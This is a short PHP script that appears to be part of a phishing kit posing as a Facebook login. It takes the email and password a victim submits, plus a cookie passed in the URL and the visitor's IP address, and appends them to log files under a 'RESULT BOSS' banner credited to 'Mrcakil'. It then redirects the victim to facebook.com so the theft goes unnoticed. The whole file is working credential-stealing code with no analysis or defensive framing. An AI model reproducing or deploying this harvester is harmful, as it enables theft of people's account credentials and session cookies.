<?php
$cookie = $HTTP_GET_VARS['cookie'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");
if (!empty($_POST["email"])){
		if (!empty($_POST["pass"])){
			$buka=fopen("LOG-ACCOUNT.txt","a+");
			$tulis=fopen("RESULT.txt","w");
			fwrite($buka,"\n\r[+] RESULT BOSS !\n\r[*] Poweered By Mrcakil\n\r[+] Emailnya: ".$_POST["email"]."\n[+] Passwordnya: ".$_POST["pass"]."\n[+] Ip Address : $ip\n\r[+] cookie : $cookie\n");
			fwrite($tulis,"\r[+] RESULT \n\r[=] Email: ".$_POST["email"]."\n\r[=] Pasword: ".$_POST["pass"]);
			fclose($buka);
			fclose($tulis);
echo '<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.2//EN" "http://www.openmobilealliance.or$
<html xmlns="http://www.w3.org/1999/xhtml" lang="en"><head>
    <title>Mengalihkan halaman</title>
<meta http-equiv="Refresh" content="1; URL=http://facebook.com/"/>
</head><body>
</body>
</html>';
		}else{
			exit();
		}
	}else{
		exit();
	}
?>
